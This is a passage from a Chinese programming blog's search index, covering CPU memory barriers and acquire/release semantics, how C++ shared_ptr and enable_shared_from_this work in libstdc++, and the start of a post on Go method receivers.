class=\"line\">    r1 = y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void thread2()&#123;</span><br><span class=\"line\">    y = 1;</span><br><span class=\"line\">    asm volatile(&quot;&quot; ::: &quot;memory&quot;);</span><br><span class=\"line\">    r2 = x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>asm volatile(&quot;&quot; ::: &quot;memory&quot;);</code>这行代码可以阻止编译器的优化，且不会插入任何汇编代码。发现执行结果没有改变，所以原因和编译器无关。</p>\n<h4 id=\"内存屏障\"><a href=\"#内存屏障\" class=\"headerlink\" title=\"内存屏障\"></a>内存屏障</h4><p>上面例子中，阻止内存乱序发生的方法是在两条指令之间引入CPU屏障或者说内存屏障。在不同的处理器中，内存屏障的指令是不同的，x86/x64中可以使用mfence指令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">void thread1()&#123;</span><br><span class=\"line\">    x = 1;</span><br><span class=\"line\">    asm volatile(&quot;mfence&quot; ::: &quot;memory&quot;);</span><br><span class=\"line\">    r1 = y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void thread2()&#123;</span><br><span class=\"line\">    y = 1;</span><br><span class=\"line\">    asm volatile(&quot;mfence&quot; ::: &quot;memory&quot;);</span><br><span class=\"line\">    r2 = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">/*</span><br><span class=\"line\">...</span><br><span class=\"line\">reorder count(0), total count(148438)</span><br><span class=\"line\">reorder count(0), total count(148439)</span><br><span class=\"line\">reorder count(0), total count(148440)</span><br><span class=\"line\">...</span><br><span class=\"line\">*/</span><br></pre></td></tr></table></figure>\n<p>最后乱序消失了。<br>这里mfence就是内存屏障了，mfence属于全功能的屏障，可以阻止指令上下的代码发生乱序。除了全功能屏障，还有Acquire和Release。<br>Acquire应用于读操作，可以是单纯的读或者是属于RMW中的R，Acquire紧跟读操作，它可以阻止该读操作与随后的所有的读写指令乱序。<br>Release应用于写操作，可以是单纯的写或者是RMW中的W，Release指令后紧跟写操作，它可以阻止该写操作与任何之前的读写指令乱序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//http://preshing.com/20120913/acquire-and-release-semantics/</span><br><span class=\"line\"></span><br><span class=\"line\">Acquire semantics is a property that can only apply to operations that read from shared memory, whether they are read-modify-write operations or plain loads. The operation is then considered a read-acquire. Acquire semantics prevent memory reordering of the read-acquire with any read or write operation that follows it in program order.</span><br><span class=\"line\"></span><br><span class=\"line\">Release semantics is a property that can only apply to operations that write to shared memory, whether they are read-modify-write operations or plain stores. The operation is then considered a write-release. Release semantics prevent memory reordering of the write-release with any read or write operation that precedes it in program order.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Acquire和Release会比全功能的屏障更轻量一些。注意Acquire和Release指的是语义，不同平台有不同的指令来实现，x86和x64甚至是不提供的，因为天生就自带该语义。<br>我们可以看到Acquire可以隔绝(读,读),(读,写)之间的指令；Release可以隔绝(读,写)和(写,写)之间的指令；但是却都不能隔绝(写,读)指令。(写,读)指令的屏障相对更昂贵，x86和x64虽然天生自带Acquire和Release语义，但是对于写、读指令的屏障也只能<code>mfence</code>指令来实现，相对来说其他3个场景则不需要额外指令，简单多了。我们上面的例子就是一个(写,读)场景。</p>\n<h4 id=\"单处理器\"><a href=\"#单处理器\" class=\"headerlink\" title=\"单处理器\"></a>单处理器</h4><p>还有一个简单但不切实际的方式来达到顺序一致性是禁用编译器优化（前面讲了禁用优化的指令），并且绑定你的所有线程到同一个处理器上。<br>那么为什么单处理器上的指令不会有乱序执行的问题？因为这是CPU乱序机制基本的保证，处理器不是不做乱序，而是它清楚的知道自己的乱序情况，因而可以很聪明的来避免会带来副作用的乱序操作。可以看这个问题<a href=\"https://stackoverflow.com/questions/33907176/why-doesnt-the-instruction-reorder-issue-occur-on-a-single-cpu-core\">Why doesn’t the instruction reorder issue occur on a single CPU core</a>。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>最后我用一张图来表示Lock-Free，RMW，CAS，顺序一致性，内存屏障之间的关系。<br>（图片版权归原作者所有）<br><img src=\"/linkimage/reorder/techniques.png\" alt=\"lockfree技术点关系图\"></p>\n<h3 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h3><p>[1]<a href=\"http://preshing.com/20120612/an-introduction-to-lock-free-programming/\">an-introduction-to-lock-free-programming</a><br>[2]<a href=\"http://preshing.com/20120913/acquire-and-release-semantics/\">acquire-and-release-semantics</a><br>[3][Lockless Programming Considerations for Xbox 360 and Microsoft Windows][locklessmsurl]<br>[locklessmsurl]: <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ee418650(v=vs.85).aspx\">https://msdn.microsoft.com/en-us/library/windows/desktop/ee418650(v=vs.85).aspx</a></p>\n","categories":["知识"],"tags":["线程"]},{"title":"shared_ptr 之shared_from_this","url":"/2016/11/14/sharedptr/","content":"<h1 id=\"shared-ptr-之shared-from-this\"><a href=\"#shared-ptr-之shared-from-this\" class=\"headerlink\" title=\"shared_ptr 之shared_from_this\"></a>shared_ptr 之shared_from_this</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>shared_ptr包含在头文件&lt; memory &gt;中，它被用于共享某个指针的场景下智能管理指针的生命周期。<br>怎么个智能法：当没人再用这个指针的时候释放指针，看起来很像GC对不对，不过比GC及时，shared_ptr是一旦没人用了立即释放，而GC是会等等看，看情况再来释放。</p>\n<p>首先来看一个典型的用法：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">simple</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">sp</span><span class=\"params\">(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>(<span class=\"number\">0</span>))</span></span>;</span><br><span class=\"line\">\tstd::shared_ptr&lt;<span class=\"keyword\">int</span>&gt; sp2 = sp;\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看出两点，一个是shared_ptr是可以赋值给别的变量的，不需要像unique_ptr那样通过move来赋值，因为shared_ptr不是独占指针而是共享，所以赋值是很平常的操作。 二是你不需要去手动释放该指针，new出来的变量会在最后一个相关联的shared_ptr消失时被释放，也就是在simple函数退出时，sp和sp2相继被销毁，于是new出来的变量也紧接着被释放，没有后顾之忧。</p>\n<p>再来看一个错误的用法：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">fail</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> * p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">sp</span><span class=\"params\">(p)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">sp2</span><span class=\"params\">(p)</span></span>;\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n\n<p>这里p被送到两个shared_ptr中，是否也是没有后顾之忧呢，并不是。为啥？上个例子中sp和sp2是有关联的，所以最后一个负责释放new的变量。而这里sp和sp2是没有关联的，他们并不知道对方的存在，因此sp和sp2会争相去释放p指针，导致重复释放。所以要注意，一个裸指针只能用来初始化一个shared_ptr，就好比你只能嫁给一个男人，然后结婚后可以生出一堆的孩子，但是你不能同时嫁给两个人，这两个男人一定会撕逼的。你只能与你的丈夫儿子共享，不能共享给多个丈夫，程序也是有伦理的！</p>\n<h2 id=\"shared-from-this使用场景\"><a href=\"#shared-from-this使用场景\" class=\"headerlink\" title=\"shared_from_this使用场景\"></a>shared_from_this使用场景</h2><p>终于要说到这个点上了, 来看使用场景</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Widget</span>;</span></span><br><span class=\"line\">std::vector&lt;std::shared_ptr&lt;Widget&gt; &gt; processedWidgets;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Widget</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">process</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"> \tprocessedWidgets.<span class=\"built_in\">emplace_back</span>(<span class=\"keyword\">this</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">\tWidget * p=<span class=\"keyword\">new</span> <span class=\"built_in\">Widget</span>();</span><br><span class=\"line\">\tprocessedWidgets.<span class=\"built_in\">emplace_back</span>(p);</span><br><span class=\"line\">\tp-&gt;<span class=\"built_in\">process</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个使用场景的关键是如果一个类的成员函数需要产生一个持有自身的shared_ptr该怎么办，在这个例子中我们使用了processedWidgets.emplace_back(this); 把this指针传给shared_ptr来构造一个shared_ptr对象。<br>也就是在    p-&gt;process(); 之后vector中应该就有两个shared_ptr了。那这么做有没有问题呢？</p>\n<p>你应该没有忘记前面说的嫁给多个男人的问题吧，这里犯了同样的问题，processedWidgets.emplace_back(this);是一个新嫁男人的行为，调用多次就嫁多次，最后造成重复释放this的问题。</p>\n<p>所以我们的代码要改，而且必须使用enable_shared_from_this这个类：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Widget</span>;</span></span><br><span class=\"line\">std::vector&lt;std::shared_ptr&lt;Widget&gt; &gt; processedWidgets;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 继承enable_shared_from_this</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Widget</span> :</span><span class=\"keyword\">public</span> std::enable_shared_from_this&lt;Widget&gt;&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">process</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t <span class=\"comment\">// 调用shared_from_this</span></span><br><span class=\"line\"> \tprocessedWidgets.<span class=\"built_in\">emplace_back</span>(<span class=\"built_in\">shared_from_this</span>());</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">\tWidget * p=<span class=\"keyword\">new</span> <span class=\"built_in\">Widget</span>();</span><br><span class=\"line\">\tprocessedWidgets.<span class=\"built_in\">emplace_back</span>(p);</span><br><span class=\"line\">\tp-&gt;<span class=\"built_in\">process</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们通过继承enable_shared_from_this这个类，继承后就拥有了shared_from_this接口，调用它就可以获取与自身关联的shared_ptr.<br>那么为什么继承了它就能得到呢，怎么实现的呢？</p>\n<h2 id=\"shared-from-this实现原理\"><a href=\"#shared-from-this实现原理\" class=\"headerlink\" title=\"shared_from_this实现原理\"></a>shared_from_this实现原理</h2><p>秘密在shared_ptr的构造函数中，这句话意味着，要shared_from_this返回你要的东西，必须先调用shared_ptr，在我们的例子中processedWidgets.emplace_back(p);这句话会调用shared_ptr的构造函数完成秘密任务。否则shared_from_this会抛出异常。</p>\n<p>这个秘密是，我用伪码表示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">shared_ptr(TP* tp)&#123;</span><br><span class=\"line\">    if(tp instanceOf enable_shared_from_this)&#123;</span><br><span class=\"line\">         save_shared_ptr_info_into(tp-&gt;weak_ptr_obj)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">shared_ptr enable_shared_from_this::shared_from_this()&#123;</span><br><span class=\"line\">    return  get_shared_ptr_from_info(weak_ptr_obj);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>也就是在构造函数中判断这个指针是否是继承了enable_shared_from_this这个类，如果继承了就保存信息到enable_shared_from_this的某个成员中（这个成员是weak_ptr类型的，能够通过它反过来得到shared_ptr），这样shared_from_this函数就能过通过这个weak_ptr来得到shared_ptr了，weak_ptr是一种类似shared_ptr但是不会增加shared_ptr包含的指针的引用计数值的一种类，又扯出了引用计数这个名词，不想展开，总之weak_ptr能够保存shared_ptr的信息并反过来得到shared_ptr。</p>\n<h2 id=\"shared-from-this的黑科技\"><a href=\"#shared-from-this的黑科技\" class=\"headerlink\" title=\"shared_from_this的黑科技\"></a>shared_from_this的黑科技</h2><p>but！然而 instanceOf 这个功能在java中存在，在C++中却闻所未闻，于是C++只能通过它的黑科技来实现这个功能了。<br>我们来看代码</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp1&gt;</span><br><span class=\"line\">  <span class=\"keyword\">explicit</span> __shared_ptr(_Tp1* __p)</span><br><span class=\"line\">       : _M_ptr(__p), _M_refcount(__p)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> <span class=\"comment\">//......</span></span><br><span class=\"line\">  __enable_shared_from_this_helper(_M_refcount, __p, __p);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;_Lock_policy _Lp, <span class=\"keyword\">typename</span> _Tp1, <span class=\"keyword\">typename</span> _Tp2&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__enable_shared_from_this_helper(<span class=\"keyword\">const</span> __shared_count&lt;_Lp&gt;&amp;,</span><br><span class=\"line\">\t\t     <span class=\"keyword\">const</span> __enable_shared_from_this&lt;_Tp1,</span><br><span class=\"line\">\t\t     _Lp&gt;*, <span class=\"keyword\">const</span> _Tp2*) <span class=\"keyword\">noexcept</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp1, <span class=\"keyword\">typename</span> _Tp2&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__enable_shared_from_this_helper(<span class=\"keyword\">const</span> __shared_count&lt;&gt;&amp;,</span><br><span class=\"line\">\t\t     <span class=\"keyword\">const</span> enable_shared_from_this&lt;_Tp1&gt;*,</span><br><span class=\"line\">\t\t     <span class=\"keyword\">const</span> _Tp2*) <span class=\"keyword\">noexcept</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;_Lock_policy _Lp&gt;</span><br><span class=\"line\"><span class=\"keyword\">inline</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">__enable_shared_from_this_helper(<span class=\"keyword\">const</span> __shared_count&lt;_Lp&gt;&amp;, ...) <span class=\"keyword\">noexcept</span></span><br><span class=\"line\">  &#123; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意看保存shared_ptr到weak_ptr的函数就是这个__enable_shared_from_this_helper.在shared_ptr的构造函数中它会去调用这个函数，然而他并没有判断是否继承enable_shared_from_this啊？<br>我们首先来看__enable_shared_from_this_helper这个函数被重载了3个，构造函数中到底调用的是哪一个呢？<br>我们来看shared_ptr的构造函数需要吃一个裸指针，这个裸指针被传给__enable_shared_from_this_helper函数，那我们是不是能够根据这个裸指针来决定调用哪个函数呢？ 答案是肯定的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果裸指针继承了__enable_shared_from_this，那么调用第一个</span><br><span class=\"line\">如果裸指针继承了enable_shared_from_this，那么调用第二个</span><br><span class=\"line\">如果裸指针没有继承前面两个，那么调用第三个</span><br></pre></td></tr></table></figure>\n\n<p>我们看到第三个函数的实现是空的，也就是说如果没有继承，那么就啥也不做，不保存任何信息，符合我们的预期。<br>如果继承了enable_shared_from_this，调用的第二个函数的实现我不贴了，大概就是保存信息到enable_shared_from_this对象的内部。<br>那么__enable_shared_from_this是啥？加了连个下划线有什么差别吗？</p>\n<h2 id=\"下划线版本的share-ptr\"><a href=\"#下划线版本的share-ptr\" class=\"headerlink\" title=\"下划线版本的share_ptr\"></a>下划线版本的share_ptr</h2><p>如果你是个很细心的人，你会看到上面share_ptr的构造函数中函数名是__shared_ptr 而不是shared_ptr，也有多出两个下划线。<br>所以这样就有4个类了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__shared_ptr</span><br><span class=\"line\">__enable_shared_from_this</span><br><span class=\"line\">shared_ptr，</span><br><span class=\"line\">enable_shared_from_this</span><br></pre></td></tr></table></figure>\n<p>他们的关系是什么？</p>\n<p>答案是，没有下划线的是有下划线的一个特化版本，比如__shared_ptr包含两个模板参数，第二个参数是_Lock_policy.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 由于第二个模板参数有默认类型，所以可以不指定</span><br><span class=\"line\">template&lt;typename _Tp, _Lock_policy _Lp = __default_lock_policy&gt;</span><br><span class=\"line\">class __shared_ptr;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Lock_policy是关于是否采用原子操作来加减引用计数值，又提到引用计数了。总之_Lock_policy就是设置是否采用原子操作，原子操作可以确保多线程环境下得线程安全。<br>没有下划线的shared_ptr采用的是默认的Lock_policy，这种策略是在多线程环境下（链接了pthread.a）采用原子操作，非多线程环境下采用非原子操作，因为是单线程，肯定不会有资源竞争，所以采用非原子操作可减小不必要的开销。</p>\n<p>那么你要问了，说的这么智能那还要这个Lock_policy干嘛，始终采用这个默认的锁策略就好了，这个模板参数可以不用了！<br>当我带着这个问题到sof上搜索后发现，其实还是有一些人不想用这个智能的策略的，比如虽然我链接了pthread.a但是我能够手工确保我的变量使用不会被多线程访问，所以我还是想用非原子操作的版本。</p>\n<p>这个时候shared_ptr就提供了这个带下划线的版本，这个类不是标准推荐的用法，但是算是一种hack，能够满足这么要求。<br>同时记住，带下划线和不带下划线的版本之间是无法互相传递的（标准不推荐这么做所以自然不给你这个转换），所以这种非标准用法没有可移植性，如果你这么用了你和别人代码将没有互操作性。<br>那为什么不推荐用却还保留着呢，这是因为还是有小部分人是希望开放锁策略给给shared_ptr的，gcc保留着应该是防止，一旦开放锁策略的人越来越多它能够轻松把实现切换过去。</p>\n<p>下面这一段是能够通过编译的使用下划线版本share_ptr的简单例子：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Widget</span>:</span> <span class=\"keyword\">public</span> std::__enable_shared_from_this&lt;Widget,std::__default_lock_policy&gt;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\">std::__shared_ptr&lt;Widget,std::__default_lock_policy&gt; <span class=\"title\">xxx</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">shared_from_this</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\">std::__shared_ptr&lt;Widget,std::__default_lock_policy&gt; <span class=\"title\">sp</span><span class=\"params\">(<span class=\"keyword\">new</span> Widget())</span></span>;</span><br><span class=\"line\">    sp-&gt;<span class=\"built_in\">xxx</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"shared-from-this在多重赋值下的行为\"><a href=\"#shared-from-this在多重赋值下的行为\" class=\"headerlink\" title=\"shared_from_this在多重赋值下的行为\"></a>shared_from_this在多重赋值下的行为</h2><p>在前面我们就看到一个裸指针只能赋值给一个shared_ptr, 否则会有多重赋值的问题， 所以我们在探讨shared_from_this的返回值时，对于返回的内容是很确定的，或者抛出异常，或者返回一个正常值，而因为该裸指针只赋值给一个shared_ptr，那么返回的正常值一定是与该shared_ptr关联的，也就是能增加该shared_ptr的引用计数的，我又提到了引用计数。引用计数其实就是记录这个裸指针被几个shared_ptr对象所共享，但是对于初始化给多个shared_ptr的异常场景，由于多个初始化的shared_ptr彼此独立，引用计数也是彼此独立的，不会互相干扰。<br>那么不知道你有没有产生这个疑问，反正我是很有疑问的： 在裸指针被初始化给多个shared_ptr的异常场景下，shared_from_this返回的对象将会增加哪个shared_ptr的引用计数呢？ 对于这种未定义的行为通常答案是由编译器决定。不过我们还是可以试试看他的结果。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Widget</span>:</span> <span class=\"keyword\">public</span> std::enable_shared_from_this&lt;Widget&gt;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;Widget&gt; <span class=\"title\">xxx</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">shared_from_this</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">\tWidget *p = <span class=\"keyword\">new</span> <span class=\"built_in\">Widget</span>();</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;Widget&gt; <span class=\"title\">one1</span><span class=\"params\">(p)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;Widget&gt; <span class=\"title\">one2</span><span class=\"params\">(one1)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;Widget&gt; <span class=\"title\">one3</span><span class=\"params\">(one1)</span></span>;</span><br><span class=\"line\">\tstd::cout &lt;&lt; one1.<span class=\"built_in\">use_count</span>() &lt;&lt; std::endl;  <span class=\"comment\">//3</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\">std::shared_ptr&lt;Widget&gt; <span class=\"title\">two1</span><span class=\"params\">(p)</span></span>;</span><br><span class=\"line\">\tstd::cout &lt;&lt; two1.<span class=\"built_in\">use_count</span>() &lt;&lt; std::endl;  <span class=\"comment\">//1\t</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tstd::shared_ptr&lt;Widget&gt; guess = p-&gt;<span class=\"built_in\">xxx</span>();</span><br><span class=\"line\">\tstd::cout &lt;&lt; one1.<span class=\"built_in\">use_count</span>() &lt;&lt; std::endl;  <span class=\"comment\">//3</span></span><br><span class=\"line\">\tstd::cout &lt;&lt; two1.<span class=\"built_in\">use_count</span>() &lt;&lt; std::endl;  <span class=\"comment\">//2</span></span><br><span class=\"line\">\tstd::cout &lt;&lt; guess.<span class=\"built_in\">use_count</span>() &lt;&lt; std::endl;  <span class=\"comment\">//2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;  <span class=\"comment\">// crash at end</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这段代码的行为我已经注释了，可以看出裸指针通过shared_from_this返回的对象与最近一个初始化的share_ptr相关联。</p>\n","categories":["代码"],"tags":["西佳佳"]},{"title":"strange golang receiver","url":"/2019/05/23/receiver/","content":"<h1 id=\"strange-golang-receiver\"><a href=\"#strange-golang-receiver\" class=\"headerlink\" title=\"strange golang receiver\"></a>strange golang receiver</h1><h2 id=\"对象receiver\"><a href=\"#对象receiver\" class=\"headerlink\" title=\"对象receiver\"></a>对象receiver</h2><p>receiver是什么呢，一句话来解释的话约等于this指针。<br>用过c++的同学我们可以来这么来理解。</p>\n<h3 id=\"理解c-中的this指针\"><a href=\"#理解c-中的this指针\" class=\"headerlink\" title=\"理解c++中的this指针\"></a>理解c++中的this指针</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Meta</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\">string <span class=\"title\">getName</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">this</span>-&gt;name;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstring name;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>这个类的成员函数getName中调用了this指针，可是this指针没有定义过呢，哪来的呢？</p>\n<p>答案是编译器加的，由于可执行文件中并不存在对象这种概念，但是存在函数的概念，所以编译器就必须把对象的调用转成函数的调用。</p>\n<p>编译器是这么做的，他把string getName();这个成员函数转换成string getName(Meta* this);</p>\n<p>看到了吧，编译器通过增加一个this参数来吧对象传递到成员函数中去，this指针就这么来了。</p>\n<h3 id=\"golang的’this’指针\"><a href=\"#golang的’this’指针\" class=\"headerlink\" title=\"golang的’this’指针\"></a>golang的’this’指针</h3><p>我们看到c++中this是隐式提供的，golang则选择了显式的提供this指针，提供的形式就是receiver。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (receiver) funcName(inputParameters...) (outputParameters...)&#123;</span><br><span class=\"line\">\t//</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>按理说receiver也应该是一个指针吧，是的他可以是指针，比如</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Meta <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tname <span class=\"keyword\">string</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(this *Meta)</span> <span class=\"title\">getName</span><span class=\"params\">()</span> <span class=\"title\">string</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> this.name</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>本来这就完了，能跟c++对上了，偏偏他又支持非指针的形式。这就麻烦起来了，能同时用吗？差别是什么？我该用哪个？三脸懵逼。</p>\n<h3 id=\"差异解析\"><a href=\"#差异解析\" class=\"headerlink\" title=\"差异解析\"></a>差异解析</h3><p>先看能不能同时用</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Person <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(p Person)</span> <span class=\"title\">commapi</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(p *Person)</span> <span class=\"title\">commapi</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span 